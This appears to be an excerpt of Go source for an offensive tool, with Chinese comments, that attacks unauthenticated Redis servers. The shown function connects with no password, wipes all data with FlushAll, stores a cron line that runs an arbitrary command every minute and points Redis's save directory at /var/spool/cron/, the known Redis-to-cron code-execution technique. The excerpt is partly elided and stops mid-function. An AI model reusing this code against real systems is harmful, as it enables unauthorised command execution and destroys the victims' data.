...
func do(host string, port string, cmd string) error {
	...
	} else { // 如果ssh关闭 使用定时任务方法
		utils.DBGLOG("SSH关闭 使用定时任务执行")
		redisUnauthorizedCRON(host, port, cmd)
	}
	return nil
}

func redisUnauthorizedCRON(host string, port string, cmd string) {
	rdb := redis.NewClient(&redis.Options{
		Addr:     fmt.Sprintf("%v:%v", host, port),
		Password: "", // no password set
		DB:       0,  // use default DB
	...
	if rdb != nil {
		rdb.FlushAll()
		rdb.Set("adiofjs", fmt.Sprintf("\n* * * * * %v\n", cmd), time.Duration(500*time.Second))
		rdb.ConfigSet("dir", "/var/spool/cron/")
